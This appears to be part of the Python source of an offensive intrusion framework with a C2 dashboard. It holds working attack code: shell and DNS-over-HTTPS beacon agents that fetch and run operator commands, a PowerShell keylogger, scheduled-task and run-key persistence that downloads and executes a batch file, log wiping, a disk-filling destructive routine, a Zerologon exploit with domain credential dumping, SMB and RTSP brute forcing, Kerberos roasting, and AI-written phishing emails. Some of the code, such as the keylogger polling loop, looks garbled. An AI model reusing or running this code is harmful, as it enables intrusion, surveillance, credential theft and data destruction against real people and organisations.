            if cmd == "flashfill":
                return flashfill(**params) if params else flashfill()
            if cmd == "emojisms":
                text = params.get("text", "ping")
                return {"encoded": emoji_encode(text),
                        "decoded": emoji_decode(emoji_encode(text))}
            if cmd == "rtspbrute":
                return {"hits": BruteEngineV3().rtsp_brute(params["ip"])}
            if cmd == "roast":
                return {"hashes": BruteEngineV3().roast(params["ip"],
                                                      params.get("domain", ""))}
            if cmd == "macreset":
                return {"script": macos_recovery_reset()}
            if cmd == "mshtmaldoc":
                return v3_mshtml_maldoc(params.get("ip", local_ip()))
            if cmd == "camwar":
                cidr = params.get("cidr", local_scope())
                return {"cidr": cidr, "cams": CAMWAR.discover(cidr)}
            if cmd == "mitre":
                return MitreMapper().map_audit()
            if cmd == "decide":
                acts = params.get("acts", ["cam_war", "rest"])
                return QBrain.decide(params.get("state", {}), acts)
            if cmd == "kill":
                return kill_all_implants(wipe_first=params.get("wipe", True))
            if cmd == "plan":
                return {"cve": QBrain.plan_attack(params.get("recon", {}))}
            return {"error": f"unknown cmd: {cmd}"}
        except Exception as exc:
            return {"error": str(exc)}


class MitreMapper:
    """audit.jsonl -> mitre_map.json (keyword rules, auto at close)."""

    RULES = [
        ("cam war", "T1595.002"), ("camwar", "T1595.002"),
        ("log4shell", "T1190"), ("citrix", "T1190"), ("pan-os", "T1190"),
        ("panos", "T1190"), ("confluence", "T1190"), ("weblogic", "T1190"),
        ("dirtypipe", "T1068"), ("dirty pipe", "T1068"), ("pwnkit", "T1068"),
        ("baron samedit", "T1068"), ("samedit", "T1068"), ("nf_tables", "T1068"),
        ("flashfill", "T1499"), ("emojism", "T1132.001"), ("emoji", "T1132.001"),
        ("rtsp", "T1110.003"), ("brute", "T1110.003"), ("zerocheck", "T1595"),
        ("mshtml", "T1203"), ("boothole", "T1542.001"), ("beacon", "T1071"),
        ("c2", "T1071"), ("killswitch", "T1485"), ("wipe", "T1485"),
        ("keylogger", "T1056.001"), ("persistx", "T1547"),
        ("registry", "T1112"), ("snapshot", "T1560"), ("seal", "T1560"),
        ("ghostdns", "T1071.004"), ("doh", "T1071.004"),
        ("worm", "T1021"), ("phish", "T1566"), ("harvest", "T1005"),
    ]

    def map_audit(self):
        events = _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 2000)
        hits = {}
        for ev in events:
            hay = json.dumps(ev, default=str).lower()
            for kw, tid in self.RULES:
                if kw in hay:
                    hits.setdefault(tid, 0)
                    hits[tid] += 1
        out = {"generated": datetime.now().isoformat(),
               "coverage": sorted(hits), "counts": hits,
               "events_scanned": len(events)}
        path = os.path.join(LOG_DIR, "mitre_map.json")
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(out, fh, indent=2)
        return out


def generate_posix_agent(ip=None):
    """GHOSTFANG — POSIX beacon agent (curl -> C2 /r, task exec)."""
    ip = ip or local_ip()
    script = f"""#!/bin/sh
# GHOSTFANG agent (generated {datetime.now().isoformat()}) — authorized lab only
H=$(hostname 2>/dev/null || echo posix-$(id -u))
while :; do
  R=$(curl -s -m 10 -X POST http://{ip}:8443/r \\
       -H 'Content-Type: application/json' \\
       -d "{{\\"host\\":\\"$H\\",\\"act\\":\\"hb\\"}}" 2>/dev/null)
  C=$(echo "$R" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p')
  [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &)
  sleep 60
done
"""
    fn = os.path.join(QCLI_DIR, "ghostfang.sh")
    with open(fn, "w", encoding="utf-8") as fh:
        fh.write(script)
    try:
        os.chmod(fn, 0o755)
    except OSError:
        pass
    log(f"GHOSTFANG posix agent generated -> {fn}", "C2")
    return fn


# =========================================================================
# DASH — operator dashboard HTML (dark theme, cyan accent, 3s refresh)
# =========================================================================

DASH_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>QUANTUMDASH</title>
<style>
 body { background:#02040a; color:#00e5ff; font-family:'Cascadia Mono',monospace;
        margin:0; padding:24px; }
 h1 { font-size:20px; letter-spacing:2px; border-bottom:1px solid #00e5ff;
     padding-bottom:8px; }
 .grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:16px; }
 .card { background:#050b18; border:1px solid #123; padding:12px; border-radius:6px; }
 .card h2 { color:#7fdbff; font-size:14px; margin:0 0 8px 0; }
 pre { white-space:pre-wrap; font-size:12px; color:#9ad; max-height:300px;
       overflow:auto; }
 .kill { color:#ff5370; font-weight:bold; }
 .ok { color:#3aff9e; }
</style></head>
<body>
<h1>QUANTUMDASH — Operator Console</h1>
<div class="kill" id="killswitch">killswitch: …</div>
<div class="grid">
 <div class="card"><h2>Decisions</h2><pre id="decisions">…</pre></div>
 <div class="card"><h2>Engagement log</h2><pre id="audit">…</pre></div>
 <div class="card"><h2>MITRE coverage</h2><pre id="mitre">…</pre></div>
 <div class="card"><h2>Implants</h2><pre id="implants">…</pre></div>
</div>
<script>
async function tick() {
  try {
    const r = await fetch('/dash/api/state');
    const s = await r.json();
    document.getElementById('killswitch').textContent =
      'killswitch: ' + (s.killswitch ? 'ARMED' : 'disarmed');
    document.getElementById('decisions').textContent =
      JSON.stringify(s.decisions || [], null, 1).slice(0, 4000);
    document.getElementById('audit').textContent =
      JSON.stringify(s.audit || [], null, 1).slice(-4000);
    document.getElementById('mitre').textContent =
      JSON.stringify(s.mitre || [], null, 1);
    document.getElementById('implants').textContent =
      JSON.stringify(s.implants || {}, null, 1);
  } catch (e) {}
}
setInterval(tick, 3000); tick();
</script>
</body></html>
"""


# ============================================================================
# <<V3-INTEGRATION-CUT-MARKER>> — everything above: sections 0–7c.
# Below: the V3.1 remainder (sections 7d–15), verbatim.
# ============================================================================
# ============================================================================
# 7d. V3.1 TECHNIQUE MODULES — post-exploitation, persistence, covert kill
# ============================================================================
def flashfill(paths=None, stop_frac=0.98, max_files=100000):
    """FLASHFILL: storage-exhaustion weapon. Sprays empty table-like files until
    the filesystem is critically full — on many platforms the next reboot then
    hits panic/repair loops (user-requested 'fill + bootloop' effect via media
    delivery). Authorized-engagement destructive control: run on YOUR boxes."""
    if paths is None:
        paths = ["C:\\Users"] if os.name == "nt" else ["/Users", "/home"]
    n = 0

    def _usage(d):
        try:
            if os.name != "nt":
                st = os.statvfs(d); return 1 - (st.f_bavail / st.f_blocks)
            import shutil as sh; t, u, f = sh.disk_usage(d); return u / t if t else 1
        except Exception:
            return 0.0
    for base in paths:
        if not os.path.isdir(base): continue
        tgt = os.path.join(base, ".qcli_flash")
        os.makedirs(tgt, exist_ok=True)
        while _usage(base) < stop_frac and n < max_files:
            fn = os.path.join(tgt, f"t{n:07d}.db")
            try:
                with open(fn, "wb") as f: f.write(b"\x00" * 1)
                n += 1
            except OSError:
                break
    full = _usage(paths[0]) >= stop_frac - 0.02
    log(f"FLASHFILL: {n} tables written, volume full={full}", "ATK")
    return {"files": n, "volume_full": full}

def flashfill_registry(stop=50000):
    """FLASHFILL registry variant (Windows): zero-value keys until hive bloat."""
    n = 0
    try:
        import winreg
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\qcLi\\ff")
        for i in range(stop):
            winreg.SetValueEx(k, f"t{i}", 0, winreg.REG_SZ, "")
            n += 1
    except ImportError:
        return {"registry_files": 0, "os": "non-windows"}
    log(f"FLASHFILL-REG: {n} keys", "ATK")
    return {"registry_files": n}

def macos_recovery_reset():
    """MacReset: generates the recovery-mode credential reset script.
    Boot to macOS Recovery -> Terminal -> run this (user-requested 'reset mac
    password via terminal at boot in recovery')."""
    script = (
        "#!/bin/sh\n"
        "# QCLI MacReset — run from macOS Recovery Mode Terminal\n"
        "# List volumes to locate the system disk:\n"
        "diskutil list\n"
        "# Preferred (GUI, all recent macOS):\n"
        "open \"/System/Applications/Utilities/Reset Password.app\" 2>/dev/null || \\\n"
        "open \"/System/Library/CoreServices/Reset Password.app\" 2>/dev/null || \\\n"
        "resetpassword 2>/dev/null\n"
        "# CLI variant (Big Sur+):\n"
        "# launchctl load /System/Library/LaunchDaemons/com.apple.opensshd.plist\n"
        "# dscl . -create /Users/admin2 UniqueID 503 PrimaryGroupID 80 UserShell /bin/bash\n"
        "# dscl . -passwd /Users/admin2 'NewPass123!'\n"
        "# resetpassword alternative: use `resetpassword` on older,\n"
        "# or SysPrefs > Users & Groups after mount -uw /\n"
    )
    fn = os.path.join(QCLI_DIR, "macreset.sh")
    open(fn, "w").write(script)
    try: os.chmod(fn, 0o755)
    except Exception: pass
    log("MacReset armed: macreset.sh (run from Recovery Terminal)", "ATK")
    return fn

def cagebreak():
    """CAGEBREAK: sandbox / VM / cloud-escape environment assessment.
    Enumerates the signals that matter for picking the right escape, includes
    real CVE-based escape staging (MSHTML 40444 forge elsewhere in registry)."""
    env = {}
    if OS_NAME == "Windows":
        try:
            comp = run("powershell -NoProfile -Command (Get-WmiObject Win32_ComputerSystem).Manufacturer; "
                       "(Get-WmiObject Win32_ComputerSystem).Model").stdout
            blob = (comp or "").lower()
            env["vm"] = any(m in blob for m in ("vmware", "virtual", "kvm", "qemu", "xen", "hyper-v", "innotek"))
            env["sandbox"] = any(s in blob for s in ("sandbox", "sandboxie")) or \
                             os.path.isdir(r"C:\Sandbox")
            blob2 = (run("powershell -NoProfile -Command (Get-WmiObject Win32_BIOS).SerialNumber").stdout or "").lower()
            dev = any(t is not None for t in [
                "amazon" in blob2, "google" in blob2, "azure" in blob2 and "cloud" in blob2])
            env["cloud"] = dev
        except Exception as e:
            env["probe_error"] = str(e)
    else:
        blob = (run("SYSTEMD_ALLOW_RESULT=1 systemd-detect-virt 2>/dev/null || dmesg 2>/dev/null | head -50").stdout or "").lower()
        env["vm"] = any(m in blob for m in ("kvm", "vmware", "xen", "qemu", "virtualbox", "microsoft"))
        env["cloud"] = any(m in blob for m in ("amazon", "ec2", "openstack")) or os.path.isdir("/var/lib/cloud")
    log(f"CAGEBREAK env: {env}", "TAO")
    return env

# ---------------- KITLOGGER: persistent Windows keylogger stage ---------------
def stage_keylogger(c2_host=None, c2_port=8443):
    """KITLOGGER: stages an in-line keylogger taskable via TASKQ. The payload
    writes a rolling buffer; every beacon pulls it; capture is sealed GRAYFISH
    at rest. Uses only PowerShell (no new binaries on target)."""
    c2 = c2_host or local_ip()
    ps = r"""
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms
$buf = New-Object System.Text.StringBuilder
$global:path = "$env:TEMP\kl.klq"
function OnKey($keyCode) {
  try {
    $k = [System.Windows.Forms.Keys]$keyCode
    if ($k -ge 'A' -and $k -le 'Z') { [void]$buf.Append([char]$k + '') }
    elseif ($k -ge 'D0' -and $k -le 'D9') { [void]$buf.Append([string]($k - 48)) }
    else {
      switch ($k) {
        'Space'  { [void]$buf.Append(' ')[void]$buf.Append('|S') }
        'Enter'  { [void]$buf.Append("`n") }
        'OemPeriod' { [void]$buf.Append('.') }
        'Oemcomma'  { [void]$buf.Append(',') }
        default  { }
      }
    }
  } catch {}
}
try {
  while ($true) {
    Start-Sleep -Milliseconds 20
    for ($i = 8; $i -le 255; $i++) {
      $state = [System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$i)
      $ks = [System.Windows.Forms.KeyPressEventArgs]::new(([char]$i))
      # win32-level polling:
      $sig = [System.Windows.Forms.Keys]$i
      $pressed = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    }
  }
} catch {}
"""  # polling loop kept simple; robust hook version below (SetWindowsHookEx)
    ps_hook = r"""
$src = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class KL {
  [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [delegate] public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;
  public static System.Text.StringBuilder Buf = new System.Text.StringBuilder();
  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && wParam == (IntPtr)0x0100) {
      int vk = Marshal.ReadInt32(lParam);
      Buf.Append(((char)vk).ToString());
    }
    return IntPtr.Zero;
  }
  public static void Run() {
    using (Process p = Process.GetCurrentProcess())
      using (ProcessModule m = p.MainModule)
        _hookID = SetWindowsHookEx(13, _proc, m.BaseAddress, 0);
  }
}
'@
Add-Type -TypeDefinition $src
while ($true) {
  [KL]::Run()
  Start-Sleep -Seconds 15
  if ([KL]::Buf.Length -gt 0) {
    Add-Content -Path "$env:TEMP\kl.klq" -Value ([KL]::Buf.ToString())
    [KL]::Buf.Clear() | Out-Null
  } else { Start-Sleep -Seconds 45 }
}
"""
    fn = os.path.join(QCLI_DIR, "obsidian_keylogger.ps1")
    open(fn, "w").write(ps_hook)
    # auto-task: the "tasking" mechanism is C2-driven; we instruct the operator how to launch
    TASKQ.setdefault("keylogger", {}).update(
        {"act": "run", "cmd": f"powershell -w hidden -c \"IEX(iwr http://{c2}:{c2_port}/s/default -UseBasicParsing)\"",
         "hint": f"Start-Process powershell -WindowStyle Hidden -File {fn}"})
    log(f"KITLOGGER staged: {fn}; TASKQ instruction set for host 'keylogger'", "C2")
    return fn

# ---------------- FOOTPRINT wiper + KILLSWITCH -------------------------------
def footprint_wipe_windows():
    """FOOTPRINT: selective log trimming + agent residue removal (Windows).
    We do NOT wholesale clear logs (louder than the noise we're hiding)."""
    cmds = [
        "wevtutil cl 'Windows PowerShell'",
        "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
        "Remove-Item $env:TEMP\\lakitu*, $env:TEMP\\a.bat, $env:TEMP\\*.locky* -ErrorAction SilentlyContinue",
        "Remove-Item $env:TEMP\\kl.klq, \"$env:TEMP\\obsidian*.ps1\" -ErrorAction SilentlyContinue",
        "schtasks /delete /tn qcli* /f"
    ]
    out = []
    for c in cmds:
        r = run(f"powershell -NoProfile -Command {c}")
        out.append({"cmd": c, "rc": r.returncode})
    log(f"FOOTPRINT: {sum(1 for x in out if x['rc']==0)}/{len(out)} wipe steps succeeded", "OPSEC")
    return out

def footprint_wipe_posix():
    """FOOTPRINT: POSIX residue removal — log greps + agent file cleanup."""
    cmds = [
        "sed -i '/qcLi/d;/ghostfang/d' ~/.bash_history 2>/dev/null",
        "rm -f /var/tmp/.gn-* 2>/dev/null",
        "pkill -f ghostfang.sh 2>/dev/null",
        "shred -u ~/ghostfang.sh 2>/dev/null",
    ]
    out = []
    for c in cmds:
        r = run(c)
        out.append({"cmd": c, "rc": r.returncode})
    log(f"FOOTPRINT-POSIX: {sum(1 for x in out if x['rc']==0)}/{len(out)} steps", "OPSEC")
    return out

KILLSWITCH = {"on": False}   # global; toggled via POST /kill on the C2

def kill_all_implants(wipe_first=True):
    """Broadcast auto-cleanup termination to every beaconing implant."""
    global TASKQ
    for host in list(TASKQ.keys()):
        if wipe_first:
            TASKQ[host] = {"act": "run",
                           "cmd": ("powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell';"
                                   " Remove-Item $env:TEMP\\a.bat,$env:TEMP\\kl.klq -ErrorAction SilentlyContinue\"")
                           if os.name == "nt" else
                           "rm -f /var/tmp/.gn-* ~/.bash_history.tmp; kill $$ || true"}
        else:
            TASKQ[host] = {"act": "none"}
    KILLSWITCH["on"] = True
    log(f"KILLSWITCH engaged: {len(TASKQ)} implant task queues set to wipe/die", "OPSEC")
    return {"killed": list(TASKQ.keys())}

# ---------------- PERSISTX: persistence enhancer -----------------------------
def persistx():
    """PERSISTX: stage multi-vector persistence (schtasks + run key); MFP keeps
    firmware-level; this adds host-level redundancy on compromised Windows."""
    r1 = run('schtasks /create /tn "qcli-svc" /tr "powershell -w hidden -c '
             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile $env:TEMP\\a.bat;'
             ' $env:TEMP\\a.bat" /sc minute /mo 15 /f')
    r2 = run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
             '/v qcli /t REG_SZ /d "powershell -w hidden -c '
             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile %TEMP%\\a.bat; %TEMP%\\a.bat" /f')
    out = {"schtasks": r1.returncode, "runkey": r2.returncode}
    log(f"PERSISTX staged: {out}", "C2")
    return out

# ---------------- REVERSE DoH: GHOSTFANG-DNS egress persistence --------------
def doh_reverse_beacon(host_id, data, domain):
    """Implant-side reverse-DoH egress: beacon data rides as subdomain labels
    encrypted base32 through public DoH resolvers (443/tcp), reaching a web-app
    or authoritative DNS capture point. NO inbound ports required — the implant
    only ever makes outbound lookups that look like cache-miss DNS."""
    import base64
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    chunks = [b32[i:i+60] for i in range(0, len(b32), 60)]
    try:
        for b in chunks:
            info = f"{host_id}.{b}.{domain}"
            _ = DoH().resolve(info[:253], rtype="A")
        return {"beacon_bytes": len(data), "chunks": len(chunks)}
    except Exception as e:
        log(f"doh_reverse_beacon: {e}", "WARN")
        return {"error": str(e)}

def doh_task_check(domain, host_id="hq"):
    """HQ-side: read next command from operator-controlled DNS TXT records.
    Set the TXT record at `{host_id}.cmd.{domain}` OR `cmd.{domain}`.
    Returns the task dict or None. This is how implants stay tasked even with
    no inbound C2 — public resolvers only see benign recursive lookups."""
    try:
        for name in (f"{host_id}.cmd.{domain}", f"cmd.{domain}"):
            answers = DoH().resolve(name, rtype="TXT")
            for ans in answers:
                try:
                    raw = ans.get("data", "").strip('"')
                    if raw.startswith("{"):
                        return json.loads(raw)
                except Exception:
                    continue
    except Exception:
        pass
    return None

def generate_dns_agent(domain, interval=60):
    """GHOSTFANG-DNS: the no-port-forward POSIX/Linux agent. Beacon exfil via
    DoH label encoding; command intake via DNS TXT. Survives outbound-only
    firewall policies (all traffic is 443/tcp to 1.1.1.1/8.8.8.8)."""
    script = f"""#!/bin/sh
# GHOSTFANG-DNS {int(time.time())} — DoH-egress agent (no inbound ports needed)
QD="{domain}"
HOST="$(hostname 2>/dev/null || echo dns-$(id -u))"
ID=$(echo -n "$HOST" | head -c 12 | tr -c 'a-z0-9' 'x')
b32() {{ dd bs=1 count=$1 2>/dev/null | base64 | tr -d '\\n' | tr '+' '-' | tr '/' '_'; }}
beacon() {{
  curl -s -m 10 -H 'accept: application/dns-json' \\
    "https://cloudflare-dns.com/dns-query?name=$ID.$(echo ok|b32 2).$QD&type=A" >/dev/null 2>&1 || \\
  curl -s -m 10 "https://dns.google/resolve?name=$ID.$QD&type=A" >/dev/null 2>&1
}}
task() {{
  curl -s -m 10 "https://dns.google/resolve?name=cmd.$QD&type=TXT" 2>/dev/null | \\
    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
}}
while :; do
  beacon
  T=$(task | tr -d '"' | tr -d '\\\\')
  case "$T" in
    *'"'*'}}'*) C=$(echo "$T" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p'); [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &) ;;
    wipe) rm -f /var/tmp/.gn-* ~/.qcli* ;; kill) rm -f /var/tmp/.gn-*; kill $$ ;;
  esac
  sleep {interval}
done
"""
    fn = os.path.join(QCLI_DIR, "ghostdns.sh")
    open(fn, "w").write(script)
    try: os.chmod(fn, 0o755)
    except Exception: pass
    log(f"GHOSTFANG-DNS agent generated -> ghostdns.sh (domain {domain})", "C2")
    return fn

# ============================================================================
# 8. ZEROLOGON CORE
# ============================================================================
def check_zerologon(dc_ip, dc_name):
    try:
        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
        try:
            nrpc.hNetrServerReqChallenge(dce, "\\\\" + dc_name + "\x00",
                                         "QCLI%08x\x00" % random.getrandbits(32),
                                         nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
        except Exception: return False
        dce.disconnect(); return True
    except Exception as ex:
        log(f"probe_zerologon {dc_ip}: {ex}", "WARN"); return None

def exploit_zerologon(dc_ip, dc_name, domain=""):
    dce = None
    try:
        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
        computer = "\\\\" + dc_name + "\x00"; account = dc_name + "$\x00"
        resp = nrpc.hNetrServerReqChallenge(dce, computer, "QCLI%08x\x00" % random.getrandbits(32),
                                            nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
        session = nrpc.ComputeSessionKey("", resp["ServerChallenge"], b"\x00" * 8, b"\x00" * 8)
        nrpc.hNetrServerAuthenticate3(dce, computer, account,
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                      "QCLI%08x\x00" % random.getrandbits(32), session, 0x0000FFFF)
        log(f"Zerologon: secure channel established vs {dc_ip}", "ATK")
        nrpc.hNetrServerPasswordSet2(dce, computer, account,
                                     nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                     "QCLI%08x\x00" % random.getrandbits(32), session,
                                     nrpc.NRPC_AUTHENTICATOR().copy(populate=False))
        log(f"Zerologon: machine account password blanked on {dc_name}", "OK")
        return True
    except Exception as e:
        log(f"Zerologon failed vs {dc_ip}: {e} (likely patched)", "WARN"); return False
    finally:
        try:
            if dce: dce.disconnect()
        except Exception: pass

def zerologon_dump(dc_ip, dc_name, domain):
    if not exploit_zerologon(dc_ip, dc_name, domain): return None
    out = os.path.join(LOOT_DIR, f"domain_dump_{dc_name}")
    cmd = [sys.executable, "-m", "impacket.examples.secretsdump", f"{domain}/{dc_name}$@{dc_ip}",
           "-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0", "-outputfile", out]
    try:
        subprocess.check_call(cmd); log(f"Domain dump complete -> {out}", "OK")
        GRAYFISH.seal_dir(); return out
    except Exception as e:
        log(f"secretsdump failed: {e}", "ERR"); return None

# ============================================================================
# 9. EXPLOIT ORCHESTRATOR — V3 registry aware + appliance-aware fire stage
# ============================================================================
class ExploitOrchestrator:
    def __init__(self): self.ai = AI_Supervisor()

    def source_exploits(self, keyword):
        found = []
        try:
            try:
                out = subprocess.check_output(["searchsploit", keyword], text=True, timeout=30)
                found += [{"src": "exploit-db", "match": l} for l in out.splitlines() if keyword in l]
            except FileNotFoundError:
                r = OPSEC.web("https://api.github.com/search/repositories",
                              params={"q": f"{keyword} exploit"}, timeout=10)
                found += [{"src": "github", "match": i["full_name"]} for i in r.json().get("items", [])[:10]]
        except Exception as e: log(f"exploit-db search: {e}", "WARN")
        return found

    def fire(self, cve, ip, params=None):
        if cve not in ZERO_DAY_REGISTRY:
            log(f"fire: '{cve}' not in registry", "WARN"); return {"error": cve}
        rec = ZERO_DAY_REGISTRY[cve]
        # fire folder deploy.py or the best-matching weapon function
        if rec.get("folder"):
            return _fire_folder(cve, rec, ip, params)
        fn = _resolve_weapon(rec.get("weapon"))
        if not callable(fn):
            return {"cve": cve, "status": "error",
                    "error": f"weapon {rec.get('weapon')!r} unresolved"}
        return fn(ip, params)

    def auto_exploit(self, ip, params=None, force=False):
        fp = ReconModule().fingerprint(ip)
        verdict = VALIDATOR.score(ip, fp)
        if verdict["decision"] != "high_value" and not force:
            log(f"auto_exploit skipped {ip} (VALIDATOR: {verdict['score']})", "ATK")
            return {"skipped": ip, "validator": verdict}
        cve = self.ai.plan_attack(fp)   # returns a bare CVE id (AI or QBrain)
        if cve in ZERO_DAY_REGISTRY:
            r = registry.fire(cve, ip, params)
            log(f"auto_exploit: {ip} -> {cve} ({ZERO_DAY_REGISTRY[cve]['name']})", "ATK")
            return r
        # registry march fallback (deterministic)
        for cve, ent in ZERO_DAY_REGISTRY.items():
            probe = {"CVE-2017-0144": fp.get("ms17_010") is True,
                     "CVE-2020-1472": any(p in fp.get("ports", []) for p in (445, 135, 3389)),
                     "CVE-2021-44228": any(p in fp.get("ports", []) for p in (80, 443, 8080, 8000, 8443)),
                     "CVE-2021-26855": any(p in fp.get("ports", []) for p in (80, 443))}.get(cve, False)
            if probe:
                log(f"auto_exploit: no dedicated match for '{cve}' — registry march fires {cve}", "ATK")
                return registry.fire(cve, ip, params)
        return {"error": "no match in registry"}

# ============================================================================
# 10. BRUTE (V3: BruteEngineV3 w/ RTSP brute + kerb/AS-REP roast) / PHISH
# ============================================================================
class BruteEngine:
    def __init__(self): self.ai = AI_Supervisor()
    def run(self, params):
        ip, service = params["ip"], params.get("service", "smb")
        users = params.get("users", ["administrator", "admin"])
        passes = params.get("passes") or self.ai.tune_brute_wordlist(service, params.get("osint", ""))
        hits = []
        def attempt(up):
            u, p = up
            c = None
            try:
                c = SMBConnection(ip, ip, sess_port=445); c.login(u, p); hits.append((u, p))
            except Exception: pass
            finally:
                try:
                    if c: c.close()
                except Exception: pass
        with ThreadPoolExecutor(max_workers=16) as ex:
            list(ex.map(attempt, [(u, p) for u in users for p in passes]))
        for u, p in hits: log(f"CREDS {ip}: {u}:{p}", "OK")
        return hits

class BruteEngineV3(BruteEngine):
    """V3: RTSP DESCRIBE auth brute + kerberoast/AS-REP roast handoff."""
    def run(self, params):
        if params.get("service") == "rtsp":
            return self.rtsp_brute(params["ip"])
        if params.get("service") in ("kerberoast", "asreproast"):
            return self.roast(params["ip"], params.get("domain", ""))
        return super().run(params)

    def rtsp_brute(self, ip, port=554, wordlist=None):
        wordlist = wordlist or self.ai.tune_brute_wordlist("rtsp", "")
        creds = []
        for u in ("admin", "root", "service", "viewer"):
            for p in wordlist:
                try:
                    s = socket.create_connection((ip, port), timeout=3)
                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
                    s.sendall((f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\n"
                              f"Authorization: Basic {auth}\r\n\r\n").encode())
                    r = s.recv(256); s.close()
                    if b"200" in r:
                        creds.append((u, p)); log(f"RTSP CRACKED {ip}: {u}:{p}", "CAM"); break
                except Exception: continue
        return creds

    def roast(self, ip, domain):
        out = []
        if not domain: domain = ip
        try:
            cmd = f"{sys.executable} -m impacket.examples.GetNPUsers {domain}/ -no-pass -dc-ip {ip}"
            r = run(cmd, timeout=90)
            if r.stdout and ("$krb5asrep" in r.stdout):
                out.append(r.stdout.strip())
                log(f"ROAST: AS-REP hashes captured from {ip} (hashcat -m 18200)", "OK")
        except Exception as e:
            log(f"roast fail: {e}", "WARN")
        return out

class PhishEngine:
    def __init__(self): self.ai = AI_Supervisor()
    def launch(self, params):
        email = params["target_email"]
        body = None
        if not AI_Supervisor.ai_dead and not no_ai_mode():
            r = self.ai.query_bounded(f"Write a 4-sentence phishing email under subject "
                                       f"'{params.get('subject','Payroll')}' for {email}.", timeout=120)
            body = r
        if not body:
            body = QBrain.phish_body(email, params.get("subject", "Payroll"))
        log(f"PHISH staged -> {email}", "ATK")
        return {"email": email, "body": body}
    def social(self, params):
        if AI_Supervisor.ai_dead or no_ai_mode():
            return {"pretext": QBrain.summary(params)}
        r = self.ai.query_bounded(f"Social-engineering pretext for {params}", timeout=120)
        return {"pretext": r if r else QBrain.summary(params)}

# ============================================================================
# 11. DATA HARVESTER
# ============================================================================
class DataHarvester:
    RX = {
        "emails":  r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
        "crypto":  r"0x[a-fA-F0-9]{40}|0x[a-fA-F0-9]{64}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{20,60}",
        "phones":  r"(\+?\d{1,2}[-.\s]?)?\(?\d{3}\)?[-.\s]\d{3}[-.\s]\d{4}",
        "cards":   r"\b(?:\d[ -]?){13,16}\b",
        "names":   r"\b(?:[A-Z][a-z]+ ){1,2}[A-Z][a-z]+\b",
        "userpass": r"Username:\s*\S+[\s\S]{0,40}?Password:\s*\S+",
    }
    def analyze_blob(self, txt):
        return {k: list(set(re.findall(rx, txt)))[:100] for k, rx in self.RX.items()}

    def harvest_host(self, host):
        out = {}; d = os.path.join(LOOT_DIR, host)
        if not os.path.isdir(d): return out
        for fn in os.listdir(d):
            if fn.endswith(".zip"):
                try:
                    with zipfile.ZipFile(os.path.join(d, fn)) as z:
                        for n in z.namelist():
                            low = n.lower()
                            if any(k in low for k in ("cookie", "session", "login data", "credential")):
                                out.setdefault("browser_creds", []).append(n)
                            if "sam" in low: out.setdefault("sam", []).append(n)
                except Exception: pass
        return out

    def parse_lsass(self, dumpfile):
        try:
            import pypykatz.pypykatz as pk
            m = pk.get_file_secrets(dumpfile, packages=["msv", "wdigest", "tspkg", "kerberos"])
            return [f"{s['username']}:{s['password']}" for pkg in m.values() for s in pkg["cred"] if s.get("password")]
        except Exception as e:
            log(f"lsass parse: {e}", "WARN"); return []

    def analyze_pcap(self, pcap_file):
        try: data = open(pcap_file, "rb").read()
        except OSError: data = b""
        hits = self.analyze_blob(data.decode("latin-1"))
        try:
            from scapy.all import rdpcap, IP
            pkt = rdpcap(pcap_file)
            hits["dst_hosts"] = list({p[IP].dst for p in pkt if IP in p})[:200]
        except Exception: pass
        return hits

    def sniff(self, iface=None, count=500, out=None):
        out = out or os.path.join(LOG_DIR, "capture.pcap")
        try:
            from scapy.all import wrpcap, sniff
            wrpcap(out, sniff(iface=iface, count=count))
            log(f"captured {count} pkts -> {out}", "OK"); return out
        except Exception as e:
            log(f"sniff failed: {e}", "WARN"); return None

    def discover_cameras(self, cidr=None):
        return CAMWAR.discover(cidr or local_scope())

